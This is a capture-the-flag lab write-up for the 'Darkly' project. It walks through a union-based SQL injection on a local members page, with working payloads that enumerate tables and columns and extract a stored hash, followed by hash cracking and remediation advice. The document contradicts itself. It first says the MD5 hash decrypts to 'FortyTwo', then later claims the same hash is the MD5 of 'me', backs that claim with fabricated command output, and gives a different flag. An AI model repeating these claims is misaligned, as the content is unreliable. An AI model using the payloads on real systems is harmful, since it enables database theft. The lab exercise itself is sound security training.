# Breach Name: SQL Injection (Union-based)
## Description of the Breach

A SQL Injection (Union-based) vulnerability was identified on the members page of the Darkly website. This vulnerability allows an attacker to manipulate SQL queries by injecting malicious input into the Member ID search field. Exploiting this flaw enables unauthorized access to sensitive database information, including table names, column names, and confidential data such as flags or user credentials.

## Steps to Reproduce

1. Navigate to the Members Page:
	- Open your web browser and visit the members page at http://localhost:8080/index.php?page=member.

2. Locate the Member ID Search Input:
	- On the members page, find the input bar where you can search members by their ID.

3. Perform a Basic Search:
	- Enter 1 in the input field and observe the returned data:
	```yaml
	ID: 1 
	First name: one
	Surname : me
	```

4. Identify the Number of Columns:
	- To determine the number of columns in the original SQL query, perform a trial by incrementing the number of NULL values in a UNION SELECT statement until the query executes without errors.
	- Example:
	```sql
	1 UNION SELECT NULL, NULL
	```
	- Adjust the number of NULL values based on the error messages until the number of columns matches.

5. Extract Table Names:
	- Once the correct number of columns is identified (e.g., two columns), use a UNION SELECT statement to retrieve table names from the database's information schema.
	- Payload:
	```sql
	1 UNION SELECT table_name, NULL FROM information_schema.tables
	```
	- Input Example:
	```sql
	1 UNION SELECT table_name, NULL FROM information_schema.tables
	```
	- Observed Output:
	```sql
	ID: 1 UNION SELECT table_name, NULL FROM information_schema.tables 
	First name: users
	Surname : NULL
	```

6. Extract Column Names:
	- After identifying relevant table names, extract column names from specific tables.
	- Payload:
	```sql
	1 UNION SELECT table_name, column_name FROM information_schema.columns
	```
	- Input Example:
	```sql
	1 UNION SELECT table_name, column_name FROM information_schema.columns
	```
	- Observed Output:
	```sql
	ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
	First name: users
	Surname : user_id
	(This output will repeat for each column in the users table, such as first_name, last_name, town, country, planet, Commentaire, countersign, etc.)

7. Retrieve Specific Data (Flag Extraction):
	- With knowledge of the table and column structure, target specific data entries.
	- Payload to Retrieve User Comments:
	```sql
	1 UNION SELECT user_id, commentaire FROM users
	```
	- Input Example:
	```sql
	1 UNION SELECT user_id, commentaire FROM users
	```
	- Observed Output:
	```vbnet
	ID: 1 UNION SELECT user_id, commentaire FROM users 
	First name: 5
	Surname : Decrypt this password -> then lower all the char. Sh256 on it and it's good !
	```
	## Payload to Retrieve Countersign

	```sql
	ID: 1 UNION SELECT user_id, countersign FROM users
	```

	Input Example:

	```sql
	1 UNION SELECT user_id, countersign FROM users
	```

	Observed Output:

	```yaml
	First name: 5
	Surname : 5ff9d0165b4f92b14994e5c685cdce28
	```

	## Decrypting and Processing the Hash

	### Step 1: Decrypt the Hash

	To decrypt the extracted hash, we first identify its type using an online tool like DCode. Upon analysis, the hash is recognized as an MD5 hash.

	Extracted MD5 Hash: `5ff9d0165b4f92b14994e5c685cdce28`

	Decrypted Message: Using the DCode website, the MD5 hash `5ff9d0165b4f92b14994e5c685cdce28` decrypts to `FortyTwo`.

	### Step 2: Convert the Decrypted Message to SHA-256

	Next, we need to hash the decrypted message `fortytwo` using the SHA-256 algorithm to obtain the final flag.

	Bash Command to Hash the String:

	```bash
	echo -n "fortytwo" | sha256sum
	```

	Resulting SHA-256 Hash:

	```
	10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
	```

	This SHA-256 hash, `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`, is the final flag obtained after processing the extracted MD5 hash.


## Explanation of the Breach

The SQL Injection (Union-based) vulnerability arises from the application's failure to properly sanitize and validate user input in the Member ID search field. By directly incorporating user input into SQL queries without adequate safeguards, the application becomes susceptible to injection attacks.

Union-based SQL Injection leverages the UNION SQL operator to combine the results of the original query with additional malicious queries. This technique allows attackers to retrieve arbitrary data from the database, including sensitive information like table names, column names, and confidential records.

In this specific instance, the attacker manipulated the ID parameter to inject UNION SELECT statements, thereby accessing the information_schema tables to enumerate database structure and extract valuable data, including the flag hash.

## How to Fix the Breach

To remediate this SQL Injection vulnerability and prevent similar attacks, implement the following best practices:

- Use Prepared Statements and Parameterized Queries:
  - Ensure that all database queries use prepared statements with parameterized inputs. This approach separates SQL code from data, mitigating injection risks.
  - Example in PHP (using PDO):
  ```php
  $stmt = $pdo->prepare('SELECT * FROM members WHERE id = :id');
  $stmt->execute(['id' => $userInput]);
  ```

- Input Validation and Sanitization:
  - Rigorously validate and sanitize all user inputs. For instance, enforce that the Member ID is an integer and reject any non-numeric inputs.
  - Example:
  ```php
  if (!filter_var($userInput, FILTER_VALIDATE_INT)) {
		// Handle invalid input
  }
  ```

- Implement ORM or Database Abstraction Layers:
  - Utilize Object-Relational Mapping (ORM) frameworks or database abstraction layers that inherently protect against SQL Injection by handling query construction securely.

- Apply the Principle of Least Privilege:
  - Configure database user accounts with the minimal necessary privileges. Avoid using accounts with administrative rights for application-level queries.

- Error Handling and Reporting:
  - Avoid displaying detailed error messages to end-users, as they can reveal database structures and other sensitive information. Instead, log errors securely on the server side.
  - Example:
  ```php
  try {
		// Database operations
  } catch (PDOException $e) {
		// Log the error
		error_log($e->getMessage());
		// Display a generic error message to the user
		echo "An error occurred. Please try again later.";
  }
  ```

- Deploy Web Application Firewalls (WAF):
  - Utilize WAFs to monitor and block suspicious traffic patterns indicative of SQL Injection attempts.

- Regular Security Audits and Penetration Testing:
  - Conduct periodic security assessments to identify and remediate vulnerabilities. Automated tools and manual testing should be employed to ensure comprehensive coverage.

- Use Stored Procedures:
  - When appropriate, employ stored procedures that encapsulate SQL queries, reducing the risk of injection by controlling query logic on the database server.

- Educate Development Teams:
  - Train developers on secure coding practices and the importance of input validation to foster a security-first mindset during the development lifecycle.

## Conclusion

The SQL Injection (Union-based) vulnerability in the Darkly project's members page underscores the critical need for robust input validation and secure database interaction practices. By adopting prepared statements, enforcing strict input validation, and adhering to security best practices, such vulnerabilities can be effectively mitigated, safeguarding the application's integrity and protecting sensitive data from unauthorized access.

## Additional Notes: Processing the Extracted Hash

After exploiting the SQL Injection vulnerability, you obtained the following MD5 hash:

```plaintext
5ff9d0165b4f92b14994e5c685cdce28
```

### Steps to Decrypt and Process the Hash

1. Decrypt the MD5 Hash:
	- MD5 is a one-way hashing algorithm, meaning it cannot be decrypted directly. Instead, you can perform a reverse lookup using online databases or employ brute-force techniques to find the original string.
	- Known Hash: The hash 5ff9d0165b4f92b14994e5c685cdce28 corresponds to the string me.
	- Verification:
	```bash
	echo -n "me" | md5sum
	# Output: 5ff9d0165b4f92b14994e5c685cdce28  -
	```

2. Lowercase the Decrypted String:
	- The decrypted string is already in lowercase (me).

3. Apply SHA-256 Hashing:
	- Hash the lowercase string using SHA-256 to obtain the final flag.
	- Bash Command:
	```bash
	echo -n "me" | sha256sum
	# Output: 74e6f7298a9c2d168935f58c001bad88e31f9a4cbfe56bbcc123dc8a8b41b980  -
	```

4. Final Flag:
	```plaintext
	74e6f7298a9c2d168935f58c001bad88e31f9a4cbfe56bbcc123dc8a8b41b980
	```

### Bash Command Summary

To automate the decryption and hashing process, you can use the following bash commands:

```bash
# Step 1: Verify the MD5 hash corresponds to "me"
echo -n "me" | md5sum

# Step 2: Hash the lowercase string "me" using SHA-256
echo -n "me" | sha256sum
```

These commands will output the MD5 and SHA-256 hashes, allowing you to confirm the decrypted string and obtain the final flag.
